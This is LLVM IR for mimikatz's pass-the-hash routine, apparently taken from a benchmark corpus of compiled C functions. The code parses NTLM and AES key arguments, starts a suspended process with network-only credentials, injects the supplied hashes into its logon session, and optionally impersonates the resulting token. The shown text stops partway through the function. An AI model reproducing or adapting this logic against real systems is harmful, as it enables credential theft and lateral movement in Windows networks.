; ModuleID = '/home/carl/AnghaBench/mimikatz/mimikatz/modules/sekurlsa/extr_kuhl_m_sekurlsa.c_kuhl_m_sekurlsa_pth.c'
source_filename = "/home/carl/AnghaBench/mimikatz/mimikatz/modules/sekurlsa/extr_kuhl_m_sekurlsa.c_kuhl_m_sekurlsa_pth.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_9__ = type { %struct.TYPE_8__ }
%struct.TYPE_8__ = type { i32, i64 }
%struct.TYPE_10__ = type { i64, i32*, i32*, i32*, i32, i32*, i32*, i32*, %struct.TYPE_8__* }
%struct.TYPE_11__ = type { i32, i32, i32, i32 }

@LM_NTLM_HASH_LENGTH = common dso_local global i32 0, align 4
@AES_128_KEY_LENGTH = common dso_local global i32 0, align 4
@AES_256_KEY_LENGTH = common dso_local global i32 0, align 4
@FALSE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [5 x i32] [i32 108, i32 117, i32 105, i32 100, i32 0], align 4
@.str.1 = private unnamed_addr constant [5 x i32] [i32 117, i32 115, i32 101, i32 114, i32 0], align 4
@.str.2 = private unnamed_addr constant [7 x i32] [i32 100, i32 111, i32 109, i32 97, i32 105, i32 110, i32 0], align 4
@.str.3 = private unnamed_addr constant [12 x i32] [i32 105, i32 109, i32 112, i32 101, i32 114, i32 115, i32 111, i32 110, i32 97, i32 116, i32 101, i32 0], align 4
@.str.4 = private unnamed_addr constant [4 x i32] [i32 114, i32 117, i32 110, i32 0], align 4
@_wpgmptr = common dso_local global i8* null, align 8
@.str.5 = private unnamed_addr constant [8 x i32] [i32 99, i32 109, i32 100, i32 46, i32 101, i32 120, i32 101, i32 0], align 4
@.str.6 = private unnamed_addr constant [49 x i32] [i32 117, i32 115, i32 101, i32 114, i32 9, i32 58, i32 32, i32 37, i32 115, i32 10, i32 100, i32 111, i32 109, i32 97, i32 105, i32 110, i32 9, i32 58, i32 32, i32 37, i32 115, i32 10, i32 112, i32 114, i32 111, i32 103, i32 114, i32 97, i32 109, i32 9, i32 58, i32 32, i32 37, i32 115, i32 10, i32 105, i32 109, i32 112, i32 101, i32 114, i32 115, i32 46, i32 9, i32 58, i32 32, i32 37, i32 115, i32 10, i32 0], align 4
@.str.7 = private unnamed_addr constant [4 x i32] [i32 121, i32 101, i32 115, i32 0], align 4
@.str.8 = private unnamed_addr constant [3 x i32] [i32 110, i32 111, i32 0], align 4
@.str.9 = private unnamed_addr constant [27 x i32] [i32 77, i32 105, i32 115, i32 115, i32 105, i32 110, i32 103, i32 32, i32 97, i32 114, i32 103, i32 117, i32 109, i32 101, i32 110, i32 116, i32 32, i32 58, i32 32, i32 100, i32 111, i32 109, i32 97, i32 105, i32 110, i32 10, i32 0], align 4
@.str.10 = private unnamed_addr constant [25 x i32] [i32 77, i32 105, i32 115, i32 115, i32 105, i32 110, i32 103, i32 32, i32 97, i32 114, i32 103, i32 117, i32 109, i32 101, i32 110, i32 116, i32 32, i32 58, i32 32, i32 117, i32 115, i32 101, i32 114, i32 10, i32 0], align 4
@.str.11 = private unnamed_addr constant [7 x i32] [i32 97, i32 101, i32 115, i32 49, i32 50, i32 56, i32 0], align 4
@MIMIKATZ_NT_BUILD_NUMBER = common dso_local global i64 0, align 8
@KULL_M_WIN_MIN_BUILD_7 = common dso_local global i64 0, align 8
@.str.12 = private unnamed_addr constant [10 x i32] [i32 65, i32 69, i32 83, i32 49, i32 50, i32 56, i32 9, i32 58, i32 32, i32 0], align 4
@.str.13 = private unnamed_addr constant [2 x i32] [i32 10, i32 0], align 4
@.str.14 = private unnamed_addr constant [41 x i32] [i32 65, i32 69, i32 83, i32 49, i32 50, i32 56, i32 32, i32 107, i32 101, i32 121, i32 32, i32 108, i32 101, i32 110, i32 103, i32 116, i32 104, i32 32, i32 109, i32 117, i32 115, i32 116, i32 32, i32 98, i32 101, i32 32, i32 51, i32 50, i32 32, i32 40, i32 49, i32 54, i32 32, i32 98, i32 121, i32 116, i32 101, i32 115, i32 41, i32 10, i32 0], align 4
@.str.15 = private unnamed_addr constant [68 x i32] [i32 65, i32 69, i32 83, i32 49, i32 50, i32 56, i32 32, i32 107, i32 101, i32 121, i32 32, i32 111, i32 110, i32 108, i32 121, i32 32, i32 115, i32 117, i32 112, i32 112, i32 111, i32 114, i32 116, i32 101, i32 100, i32 32, i32 102, i32 114, i32 111, i32 109, i32 32, i32 87, i32 105, i32 110, i32 100, i32 111, i32 119, i32 115, i32 32, i32 56, i32 46, i32 49, i32 32, i32 40, i32 111, i32 114, i32 32, i32 55, i32 47, i32 56, i32 32, i32 119, i32 105, i32 116, i32 104, i32 32, i32 107, i32 98, i32 50, i32 56, i32 55, i32 49, i32 57, i32 57, i32 55, i32 41, i32 10, i32 0], align 4
@.str.16 = private unnamed_addr constant [7 x i32] [i32 97, i32 101, i32 115, i32 50, i32 53, i32 54, i32 0], align 4
@.str.17 = private unnamed_addr constant [10 x i32] [i32 65, i32 69, i32 83, i32 50, i32 53, i32 54, i32 9, i32 58, i32 32, i32 0], align 4
@.str.18 = private unnamed_addr constant [41 x i32] [i32 65, i32 69, i32 83, i32 50, i32 53, i32 54, i32 32, i32 107, i32 101, i32 121, i32 32, i32 108, i32 101, i32 110, i32 103, i32 116, i32 104, i32 32, i32 109, i32 117, i32 115, i32 116, i32 32, i32 98, i32 101, i32 32, i32 54, i32 52, i32 32, i32 40, i32 51, i32 50, i32 32, i32 98, i32 121, i32 116, i32 101, i32 115, i32 41, i32 10, i32 0], align 4
@.str.19 = private unnamed_addr constant [68 x i32] [i32 65, i32 69, i32 83, i32 50, i32 53, i32 54, i32 32, i32 107, i32 101, i32 121, i32 32, i32 111, i32 110, i32 108, i32 121, i32 32, i32 115, i32 117, i32 112, i32 112, i32 111, i32 114, i32 116, i32 101, i32 100, i32 32, i32 102, i32 114, i32 111, i32 109, i32 32, i32 87, i32 105, i32 110, i32 100, i32 111, i32 119, i32 115, i32 32, i32 56, i32 46, i32 49, i32 32, i32 40, i32 111, i32 114, i32 32, i32 55, i32 47, i32 56, i32 32, i32 119, i32 105, i32 116, i32 104, i32 32, i32 107, i32 98, i32 50, i32 56, i32 55, i32 49, i32 57, i32 57, i32 55, i32 41, i32 10, i32 0], align 4
@.str.20 = private unnamed_addr constant [4 x i32] [i32 114, i32 99, i32 52, i32 0], align 4
@.str.21 = private unnamed_addr constant [5 x i32] [i32 110, i32 116, i32 108, i32 109, i32 0], align 4
@.str.22 = private unnamed_addr constant [8 x i32] [i32 78, i32 84, i32 76, i32 77, i32 9, i32 58, i32 32, i32 0], align 4
@.str.23 = private unnamed_addr constant [48 x i32] [i32 110, i32 116, i32 108, i32 109, i32 32, i32 104, i32 97, i32 115, i32 104, i32 47, i32 114, i32 99, i32 52, i32 32, i32 107, i32 101, i32 121, i32 32, i32 108, i32 101, i32 110, i32 103, i32 116, i32 104, i32 32, i32 109, i32 117, i32 115, i32 116, i32 32, i32 98, i32 101, i32 32, i32 51, i32 50, i32 32, i32 40, i32 49, i32 54, i32 32, i32 98, i32 121, i32 116, i32 101, i32 115, i32 41, i32 10, i32 0], align 4
@.str.24 = private unnamed_addr constant [44 x i32] [i32 109, i32 111, i32 100, i32 101, i32 9, i32 58, i32 32, i32 114, i32 101, i32 112, i32 108, i32 97, i32 99, i32 105, i32 110, i32 103, i32 32, i32 78, i32 84, i32 76, i32 77, i32 47, i32 82, i32 67, i32 52, i32 32, i32 107, i32 101, i32 121, i32 32, i32 105, i32 110, i32 32, i32 97, i32 32, i32 115, i32 101, i32 115, i32 115, i32 105, i32 111, i32 110, i32 10, i32 0], align 4
@KULL_M_PROCESS_CREATE_LOGON = common dso_local global i32 0, align 4
@CREATE_SUSPENDED = common dso_local global i32 0, align 4
@LOGON_NETCREDENTIALS_ONLY = common dso_local global i32 0, align 4
@.str.25 = private unnamed_addr constant [1 x i32] zeroinitializer, align 4
@.str.26 = private unnamed_addr constant [27 x i32] [i32 32, i32 32, i32 124, i32 32, i32 32, i32 80, i32 73, i32 68, i32 32, i32 32, i32 37, i32 117, i32 10, i32 32, i32 32, i32 124, i32 32, i32 32, i32 84, i32 73, i32 68, i32 32, i32 32, i32 37, i32 117, i32 10, i32 0], align 4
@TOKEN_READ = common dso_local global i32 0, align 4
@TOKEN_DUPLICATE = common dso_local global i32 0, align 4
@TokenStatistics = common dso_local global i32 0, align 4
@TOKEN_QUERY = common dso_local global i32 0, align 4
@TOKEN_IMPERSONATE = common dso_local global i32 0, align 4
@SecurityDelegation = common dso_local global i32 0, align 4
@TokenImpersonation = common dso_local global i32 0, align 4
@.str.27 = private unnamed_addr constant [27 x i32] [i32 42, i32 42, i32 32, i32 84, i32 111, i32 107, i32 101, i32 110, i32 32, i32 73, i32 109, i32 112, i32 101, i32 114, i32 115, i32 111, i32 110, i32 97, i32 116, i32 105, i32 111, i32 110, i32 32, i32 42, i32 42, i32 10, i32 0], align 4
@.str.28 = private unnamed_addr constant [15 x i32] [i32 83, i32 101, i32 116, i32 84, i32 104, i32 114, i32 101, i32 97, i32 100, i32 84, i32 111, i32 107, i32 101, i32 110, i32 0], align 4
@.str.29 = private unnamed_addr constant [17 x i32] [i32 68, i32 117, i32 112, i32 108, i32 105, i32 99, i32 97, i32 116, i32 101, i32 84, i32 111, i32 107, i32 101, i32 110, i32 69, i32 120, i32 0], align 4
@STATUS_SUCCESS = common dso_local global i32 0, align 4
@STATUS_FATAL_APP_EXIT = common dso_local global i32 0, align 4
@.str.30 = private unnamed_addr constant [20 x i32] [i32 71, i32 101, i32 116, i32 84, i32 111, i32 107, i32 101, i32 110, i32 73, i32 110, i32 102, i32 111, i32 114, i32 109, i32 97, i32 116, i32 105, i32 111, i32 110, i32 0], align 4
@.str.31 = private unnamed_addr constant [17 x i32] [i32 79, i32 112, i32 101, i32 110, i32 80, i32 114, i32 111, i32 99, i32 101, i32 115, i32 115, i32 84, i32 111, i32 107, i32 101, i32 110, i32 0], align 4
@.str.32 = private unnamed_addr constant [24 x i32] [i32 67, i32 114, i32 101, i32 97, i32 116, i32 101, i32 80, i32 114, i32 111, i32 99, i32 101, i32 115, i32 115, i32 87, i32 105, i32 116, i32 104, i32 76, i32 111, i32 103, i32 111, i32 110, i32 87, i32 0], align 4
@.str.33 = private unnamed_addr constant [18 x i32] [i32 66, i32 97, i32 115, i32 32, i32 117, i32 115, i32 101, i32 114, i32 32, i32 111, i32 114, i32 32, i32 76, i32 85, i32 73, i32 68, i32 10, i32 0], align 4
@.str.34 = private unnamed_addr constant [62 x i32] [i32 77, i32 105, i32 115, i32 115, i32 105, i32 110, i32 103, i32 32, i32 97, i32 116, i32 32, i32 108, i32 101, i32 97, i32 115, i32 116, i32 32, i32 111, i32 110, i32 101, i32 32, i32 97, i32 114, i32 103, i32 117, i32 109, i32 101, i32 110, i32 116, i32 32, i32 58, i32 32, i32 110, i32 116, i32 108, i32 109, i32 47, i32 114, i32 99, i32 52, i32 32, i32 79, i32 82, i32 32, i32 97, i32 101, i32 115, i32 49, i32 50, i32 56, i32 32, i32 79, i32 82, i32 32, i32 97, i32 101, i32 115, i32 50, i32 53, i32 54, i32 10, i32 0], align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @kuhl_m_sekurlsa_pth(i32 %0, i32** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca %struct.TYPE_9__, align 8
  %10 = alloca %struct.TYPE_10__, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i32*, align 8
  %13 = alloca i32*, align 8
  %14 = alloca i32*, align 8
  %15 = alloca i32*, align 8
  %16 = alloca i32*, align 8
  %17 = alloca i32*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.TYPE_11__, align 4
  %22 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i32** %1, i32*** %4, align 8
  %23 = load i32, i32* @LM_NTLM_HASH_LENGTH, align 4
  %24 = zext i32 %23 to i64
  %25 = call i8* @llvm.stacksave()
  store i8* %25, i8** %5, align 8
  %26 = alloca i32, i64 %24, align 16
  store i64 %24, i64* %6, align 8
  %27 = load i32, i32* @AES_128_KEY_LENGTH, align 4
  %28 = zext i32 %27 to i64
  %29 = alloca i32, i64 %28, align 16
  store i64 %28, i64* %7, align 8
  %30 = load i32, i32* @AES_256_KEY_LENGTH, align 4
  %31 = zext i32 %30 to i64
  %32 = alloca i32, i64 %31, align 16
  store i64 %31, i64* %8, align 8
  %33 = bitcast %struct.TYPE_10__* %10 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %33, i8 0, i64 72, i1 false)
  %34 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %10, i32 0, i32 0
  %35 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %9, i32 0, i32 0
  %36 = ptrtoint %struct.TYPE_8__* %35 to i64
  store i64 %36, i64* %34, align 8
  %37 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %10, i32 0, i32 4
  %38 = load i32, i32* @FALSE, align 4
  store i32 %38, i32* %37, align 8
  store i32* null, i32** %17, align 8
  %39 = load i32, i32* %3, align 4
  %40 = load i32**, i32*** %4, align 8
  %41 = call i64 @kull_m_string_args_byName(i32 %39, i32** %40, i8* bitcast ([5 x i32]* @.str to i8*), i32** %17, i8* null)
  %42 = icmp ne i64 %41, 0
  br i1 %42, label %43, label %50

43:                                               ; preds = %2
  %44 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %9, i32 0, i32 0
  %45 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %44, i32 0, i32 1
  store i64 0, i64* %45, align 8
  %46 = load i32*, i32** %17, align 8
  %47 = call i32 @wcstoul(i32* %46, i32* null, i32 0)
  %48 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %9, i32 0, i32 0
  %49 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %48, i32 0, i32 0
  store i32 %47, i32* %49, align 8
  br label %88

50:                                               ; preds = %2
  %51 = load i32, i32* %3, align 4
  %52 = load i32**, i32*** %4, align 8
  %53 = call i64 @kull_m_string_args_byName(i32 %51, i32** %52, i8* bitcast ([5 x i32]* @.str.1 to i8*), i32** %11, i8* null)
  %54 = icmp ne i64 %53, 0
  br i1 %54, label %55, label %85

55:                                               ; preds = %50
  %56 = load i32, i32* %3, align 4
  %57 = load i32**, i32*** %4, align 8
  %58 = call i64 @kull_m_string_args_byName(i32 %56, i32** %57, i8* bitcast ([7 x i32]* @.str.2 to i8*), i32** %12, i8* null)
  %59 = icmp ne i64 %58, 0
  br i1 %59, label %60, label %82

60:                                               ; preds = %55
  %61 = load i32, i32* %3, align 4
  %62 = load i32**, i32*** %4, align 8
  %63 = call i64 @kull_m_string_args_byName(i32 %61, i32** %62, i8* bitcast ([12 x i32]* @.str.3 to i8*), i32** null, i8* null)
  store i64 %63, i64* %22, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32**, i32*** %4, align 8
  %66 = load i64, i64* %22, align 8
  %67 = icmp ne i64 %66, 0
  br i1 %67, label %68, label %70

68:                                               ; preds = %60
  %69 = load i8*, i8** @_wpgmptr, align 8
  br label %71

70:                                               ; preds = %60
  br label %71

71:                                               ; preds = %70, %68
  %72 = phi i8* [ %69, %68 ], [ bitcast ([8 x i32]* @.str.5 to i8*), %70 ]
  %73 = call i64 @kull_m_string_args_byName(i32 %64, i32** %65, i8* bitcast ([4 x i32]* @.str.4 to i8*), i32** %13, i8* %72)
  %74 = load i32*, i32** %11, align 8
  %75 = load i32*, i32** %12, align 8
  %76 = load i32*, i32** %13, align 8
  %77 = load i64, i64* %22, align 8
  %78 = icmp ne i64 %77, 0
  %79 = zext i1 %78 to i64
  %80 = select i1 %78, i32* getelementptr inbounds ([4 x i32], [4 x i32]* @.str.7, i64 0, i64 0), i32* getelementptr inbounds ([3 x i32], [3 x i32]* @.str.8, i64 0, i64 0)
  %81 = call i32 (i8*, ...) @kprintf(i8* bitcast ([49 x i32]* @.str.6 to i8*), i32* %74, i32* %75, i32* %76, i32* %80)
  br label %84

82:                                               ; preds = %55
  %83 = call i32 @PRINT_ERROR(i8* bitcast ([27 x i32]* @.str.9 to i8*))
  br label %84

84:                                               ; preds = %82, %71
  br label %87

85:                                               ; preds = %50
  %86 = call i32 @PRINT_ERROR(i8* bitcast ([25 x i32]* @.str.10 to i8*))
  br label %87

87:                                               ; preds = %85, %84
  br label %88

88:                                               ; preds = %87, %43
  %89 = load i32, i32* %3, align 4
  %90 = load i32**, i32*** %4, align 8
  %91 = call i64 @kull_m_string_args_byName(i32 %89, i32** %90, i8* bitcast ([7 x i32]* @.str.11 to i8*), i32** %15, i8* null)
  %92 = icmp ne i64 %91, 0
  br i1 %92, label %93, label %116

93:                                               ; preds = %88
  %94 = load i64, i64* @MIMIKATZ_NT_BUILD_NUMBER, align 8
  %95 = load i64, i64* @KULL_M_WIN_MIN_BUILD_7, align 8
  %96 = icmp sge i64 %94, %95
  br i1 %96, label %97, label %113

97:                                               ; preds = %93
  %98 = load i32*, i32** %15, align 8
  %99 = load i32, i32* @AES_128_KEY_LENGTH, align 4
  %100 = call i64 @kull_m_string_stringToHex(i32* %98, i32* %29, i32 %99)
  %101 = icmp ne i64 %100, 0
  br i1 %101, label %102, label %110

102:                                              ; preds = %97
  %103 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %10, i32 0, i32 2
  store i32* %29, i32** %103, align 8
  %104 = call i32 (i8*, ...) @kprintf(i8* bitcast ([10 x i32]* @.str.12 to i8*))
  %105 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %10, i32 0, i32 2
  %106 = load i32*, i32** %105, align 8
  %107 = load i32, i32* @AES_128_KEY_LENGTH, align 4
  %108 = call i32 @kull_m_string_wprintf_hex(i32* %106, i32 %107, i32 0)
  %109 = call i32 (i8*, ...) @kprintf(i8* bitcast ([2 x i32]* @.str.13 to i8*))
  br label %112

110:                                              ; preds = %97
  %111 = call i32 @PRINT_ERROR(i8* bitcast ([41 x i32]* @.str.14 to i8*))
  br label %112

112:                                              ; preds = %110, %102
  br label %115

113:                                              ; preds = %93
  %114 = call i32 @PRINT_ERROR(i8* bitcast ([68 x i32]* @.str.15 to i8*))
  br label %115

115:                                              ; preds = %113, %112
  br label %116

116:                                              ; preds = %115, %88
  %117 = load i32, i32* %3, align 4
  %118 = load i32**, i32*** %4, align 8
  %119 = call i64 @kull_m_string_args_byName(i32 %117, i32** %118, i8* bitcast ([7 x i32]* @.str.16 to i8*), i32** %16, i8* null)
  %120 = icmp ne i64 %119, 0
  br i1 %120, label %121, label %144

121:                                              ; preds = %116
  %122 = load i64, i64* @MIMIKATZ_NT_BUILD_NUMBER, align 8
  %123 = load i64, i64* @KULL_M_WIN_MIN_BUILD_7, align 8
  %124 = icmp sge i64 %122, %123
  br i1 %124, label %125, label %141

125:                                              ; preds = %121
  %126 = load i32*, i32** %16, align 8
  %127 = load i32, i32* @AES_256_KEY_LENGTH, align 4
  %128 = call i64 @kull_m_string_stringToHex(i32* %126, i32* %32, i32 %127)
  %129 = icmp ne i64 %128, 0
  br i1 %129, label %130, label %138

130:                                              ; preds = %125
  %131 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %10, i32 0, i32 1
  store i32* %32, i32** %131, align 8
  %132 = call i32 (i8*, ...) @kprintf(i8* bitcast ([10 x i32]* @.str.17 to i8*))
  %133 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %10, i32 0, i32 1
  %134 = load i32*, i32** %133, align 8
  %135 = load i32, i32* @AES_256_KEY_LENGTH, align 4
  %136 = call i32 @kull_m_string_wprintf_hex(i32* %134, i32 %135, i32 0)
  %137 = call i32 (i8*, ...) @kprintf(i8* bitcast ([2 x i32]* @.str.13 to i8*))
  br label %140

138:                                              ; preds = %125
  %139 = call i32 @PRINT_ERROR(i8* bitcast ([41 x i32]* @.str.18 to i8*))
  br label %140

140:                                              ; preds = %138, %130
  br label %143

141:                                              ; preds = %121
  %142 = call i32 @PRINT_ERROR(i8* bitcast ([68 x i32]* @.str.19 to i8*))
  br label %143

143:                                              ; preds = %141, %140
  br label %144

144:                                              ; preds = %143, %116
  %145 = load i32, i32* %3, align 4
  %146 = load i32**, i32*** %4, align 8
  %147 = call i64 @kull_m_string_args_byName(i32 %145, i32** %146, i8* bitcast ([4 x i32]* @.str.20 to i8*), i32** %14, i8* null)
  %148 = icmp ne i64 %147, 0
  br i1 %148, label %154, label %149

149:                                              ; preds = %144
  %150 = load i32, i32* %3, align 4
  %151 = load i32**, i32*** %4, align 8
  %152 = call i64 @kull_m_string_args_byName(i32 %150, i32** %151, i8* bitcast ([5 x i32]* @.str.21 to i8*), i32** %14, i8* null)
  %153 = icmp ne i64 %152, 0
  br i1 %153, label %154, label %170

154:                                              ; preds = %149, %144
  %155 = load i32*, i32** %14, align 8
  %156 = load i32, i32* @LM_NTLM_HASH_LENGTH, align 4
  %157 = call i64 @kull_m_string_stringToHex(i32* %155, i32* %26, i32 %156)
  %158 = icmp ne i64 %157, 0
  br i1 %158, label %159, label %167

159:                                              ; preds = %154
  %160 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %10, i32 0, i32 3
  store i32* %26, i32** %160, align 8
  %161 = call i32 (i8*, ...) @kprintf(i8* bitcast ([8 x i32]* @.str.22 to i8*))
  %162 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %10, i32 0, i32 3
  %163 = load i32*, i32** %162, align 8
  %164 = load i32, i32* @LM_NTLM_HASH_LENGTH, align 4
  %165 = call i32 @kull_m_string_wprintf_hex(i32* %163, i32 %164, i32 0)
  %166 = call i32 (i8*, ...) @kprintf(i8* bitcast ([2 x i32]* @.str.13 to i8*))
  br label %169

167:                                              ; preds = %154
  %168 = call i32 @PRINT_ERROR(i8* bitcast ([48 x i32]* @.str.23 to i8*))
  br label %169

169:                                              ; preds = %167, %159
  br label %170

170:                                              ; preds = %169, %149
  %171 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %10, i32 0, i32 3
  %172 = load i32*, i32** %171, align 8
  %173 = icmp ne i32* %172, null
  br i1 %173, label %182, label %174

174:                                              ; preds = %170
  %175 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %10, i32 0, i32 2
  %176 = load i32*, i32** %175, align 8
  %177 = icmp ne i32* %176, null
  br i1 %177, label %182, label %178

178:                                              ; preds = %174
  %179 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %10, i32 0, i32 1
  %180 = load i32*, i32** %179, align 8
  %181 = icmp ne i32* %180, null
  br i1 %181, label %182, label %292

182:                                              ; preds = %178, %174, %170
  %183 = load i32*, i32** %17, align 8
  %184 = icmp ne i32* %183, null
  br i1 %184, label %185, label %188

185:                                              ; preds = %182
  %186 = call i32 (i8*, ...) @kprintf(i8* bitcast ([44 x i32]* @.str.24 to i8*))
  %187 = call i32 @kuhl_m_sekurlsa_pth_luid(%struct.TYPE_10__* %10)
  br label %291

188:                                              ; preds = %182
  %189 = load i32*, i32** %11, align 8
  %190 = icmp ne i32* %189, null
  br i1 %190, label %191, label %288

191:                                              ; preds = %188
  %192 = load i32, i32* @KULL_M_PROCESS_CREATE_LOGON, align 4
  %193 = load i32*, i32** %13, align 8
  %194 = load i32, i32* @CREATE_SUSPENDED, align 4
  %195 = load i32, i32* @LOGON_NETCREDENTIALS_ONLY, align 4
  %196 = load i32*, i32** %11, align 8
  %197 = load i32*, i32** %12, align 8
  %198 = load i32, i32* @FALSE, align 4
  %199 = call i64 @kull_m_process_create(i32 %192, i32* %193, i32 %194, i32* null, i32 %195, i32* %196, i32* %197, i8* bitcast ([1 x i32]* @.str.25 to i8*), %struct.TYPE_11__* %21, i32 %198)
  %200 = icmp ne i64 %199, 0
  br i1 %200, label %201, label %285

201:                                              ; preds = %191
  %202 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %21, i32 0, i32 3
  %203 = load i32, i32* %202, align 4
  %204 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %21, i32 0, i32 2
  %205 = load i32, i32* %204, align 4
  %206 = call i32 (i8*, ...) @kprintf(i8* bitcast ([27 x i32]* @.str.26 to i8*), i32 %203, i32 %205)
  %207 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %21, i32 0, i32 0
  %208 = load i32, i32* %207, align 4
  %209 = load i32, i32* @TOKEN_READ, align 4
  %210 = load i64, i64* %22, align 8
  %211 = icmp ne i64 %210, 0
  br i1 %211, label %212, label %214

212:                                              ; preds = %201
  %213 = load i32, i32* @TOKEN_DUPLICATE, align 4
  br label %215

214:                                              ; preds = %201
  br label %215

215:                                              ; preds = %214, %212
  %216 = phi i32 [ %213, %212 ], [ 0, %214 ]
  %217 = or i32 %209, %216
  %218 = call i64 @OpenProcessToken(i32 %208, i32 %217, i32* %19)
  %219 = icmp ne i64 %218, 0
  br i1 %219, label %220, label %276

220:                                              ; preds = %215
  %221 = load i32, i32* %19, align 4
  %222 = load i32, i32* @TokenStatistics, align 4
  %223 = call i64 @GetTokenInformation(i32 %221, i32 %222, %struct.TYPE_9__* %9, i32 16, i32* %18)
  %224 = icmp ne i64 %223, 0
  br i1 %224, label %225, label %271

225:                                              ; preds = %220
  %226 = call i32 @kuhl_m_sekurlsa_pth_luid(%struct.TYPE_10__* %10)
  %227 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %10, i32 0, i32 0
  %228 = load i64, i64* %227, align 8
  %229 = icmp ne i64 %228, 0
  br i1 %229, label %230, label %265

230:                                              ; preds = %225
  %231 = load i64, i64* %22, align 8
  %232 = icmp ne i64 %231, 0
  br i1 %232, label %233, label %260

233:                                              ; preds = %230
  %234 = load i32, i32* %19, align 4
  %235 = load i32, i32* @TOKEN_QUERY, align 4
  %236 = load i32, i32* @TOKEN_IMPERSONATE, align 4
  %237 = or i32 %235, %236
  %238 = load i32, i32* @SecurityDelegation, align 4
  %239 = load i32, i32* @TokenImpersonation, align 4
  %240 = call i64 @DuplicateTokenEx(i32 %234, i32 %237, i32* null, i32 %238, i32 %239, i32* %20)
  %241 = icmp ne i64 %240, 0
  br i1 %241, label %242, label %253

242:                                              ; preds = %233
  %243 = load i32, i32* %20, align 4
  %244 = call i64 @SetThreadToken(i32* null, i32 %243)
  %245 = icmp ne i64 %244, 0
  br i1 %245, label %246, label %248

246:                                              ; preds = %242
  %247 = call i32 (i8*, ...) @kprintf(i8* bitcast ([27 x i32]* @.str.27 to i8*))
  br label %250

248:                                              ; preds = %242
  %249 = call i32 @PRINT_ERROR_AUTO(i8* bitcast ([15 x i32]* @.str.28 to i8*))
  br label %250

250:                                              ; preds = %248, %246
  %251 = load i32, i32* %20, align 4
  %252 = call i32 @CloseHandle(i32 %251)
  br label %255

253:                                              ; preds = %233
  %254 = call i32 @PRINT_ERROR_AUTO(i8* bitcast ([17 x i32]* @.str.29 to i8*))
  br label %255

255:                                              ; preds = %253, %250
  %256 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %21, i32 0, i32 0
  %257 = load i32, i32* %256, align 4
  %258 = load i32, i32* @STATUS_SUCCESS, align 4
  %259 = call i32 @NtTerminateProcess(i32 %257, i32 %258)
  br label %264

260:                                              ; preds = %230
  %261 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %21, i32 0, i32 0
  %262 = load i32, i32* %261, align 4
  %263 = call i32 @NtResumeProcess(i32 %262)
  br label %264

264:                                              ; preds = %260, %255
  br label %270

265:                                              ; preds = %225
  %266 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %21, i32 0, i32 0
  %267 = load i32, i32* %266, align 4
  %268 = load i32, i32* @STATUS_FATAL_APP_EXIT, align 4
  %269 = call i32 @NtTerminateProcess(i32 %267, i32 %268)
  br label %270

270:                                              ; preds = %265, %264
  br label %273

271:                                              ; preds = %220
  %272 = call i32 @PRINT_ERROR_AUTO(i8* bitcast ([20 x i32]* @.str.30 to i8*))
  br label %273

273:                                              ; preds = %271, %270
  %274 = load i32, i32* %19, align 4
  %275 = call i32 @CloseHandle(i32 %274)
  br label %278

276:                                              ; preds = %215
  %277 = call i32 @PRINT_ERROR_AUTO(i8* bitcast ([17 x i32]* @.str.31 to i8*))
  br label %278

278:                                              ; preds = %276, %273
  %279 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %21, i32 0, i32 1
  %280 = load i32, i32* %279, align 4
  %281 = call i32 @CloseHandle(i32 %280)
  %282 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %21, i32 0, i32 0
  %283 = load i32, i32* %282, align 4
  %284 = call i32 @CloseHandle(i32 %283)
  br label %287

285:                                              ; preds = %191
  %286 = call i32 @PRINT_ERROR_AUTO(i8* bitcast ([24 x i32]* @.str.32 to i8*))
  br label %287

287:                                              ; preds = %285, %278
  br label %290

288:                                              ; preds = %188
  %289 = call i32 @PRINT_ERROR(i8* bitcast ([18 x i32]* @.str.33 to i8*))
  br label %290

290:                                              ; preds = %288, %287
  br label %291

291:                                              ; preds = %290, %185
  br label %294

292:                                              ; preds = %178
  %293 = call i32 @PRINT_ERROR(i8* bitcast ([62 x i32]* @.str.34 to i8*))
  br label %294

294:                                              ; preds = %292, %291
  %295 = load i32, i32* @STATUS_SUCCESS, align 4
  %296 = load i8*, i8** %5, align 8
